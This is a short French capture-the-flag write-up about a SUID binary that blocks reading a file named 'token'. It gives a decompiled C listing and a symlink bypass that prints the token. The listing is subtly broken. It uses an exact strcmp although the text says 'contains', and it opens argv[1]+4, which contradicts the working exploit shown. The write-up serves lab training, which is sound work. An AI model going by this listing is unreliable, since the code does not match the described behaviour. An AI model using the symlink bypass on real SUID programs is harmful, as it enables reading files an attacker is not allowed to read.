```bash
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Encore un fichier qui a le bit SUID activé. On peut l'exécuter avec les droits de l'utilisateur flag08.

```bash
$ ./level08
./level08 [file to read]

$ ./level08 token
You may not access 'token'
```

Le programme prend un argument, un fichier à lire. On ne peut pas lire le fichier `token` directement...

En disassemblant le binaire, on obtient les instructions suivantes :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    void *ptr;
    int fd;
    
    if (argc != 2) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }

    ptr = argv[1];
    
    if (strcmp(ptr, "token") == 0) {
        printf("You may not access '%s'\n", ptr);
        exit(1);
    }

    ptr = argv[1] + 4;
    fd = open(ptr, 0);
    
    if (fd == -1) {
        printf("Unable to open %s\n", ptr);
        exit(1);
    }

    char buffer[400];
    ssize_t bytesRead = read(fd, buffer, sizeof(buffer));
    
    if (bytesRead == -1) {
        printf("Unable to read fd %s\n", ptr);
        exit(1);
    }

    write(1, buffer, bytesRead);
    
    return 0;
}
```

Ainsi on voit que le programme verifie si argv[1] contient le mot "token" pour pouvoir refuser l'acces.
Malheureusement cette verification ne sers pas a grand chose puisqu'il suffit alors de creer un lien symbolique vers le fichier `token` pour pouvoir le lire.

```bash
$ ln -s /home/user/level08/token /tmp/magiclink
$ ./level08 /tmp/magiclink
quif5eloekouj29ke0vouxean
```

Et voila le travail :)

On se connecte ensuite avec l'utilisateur flag08 et on valide le niveau :P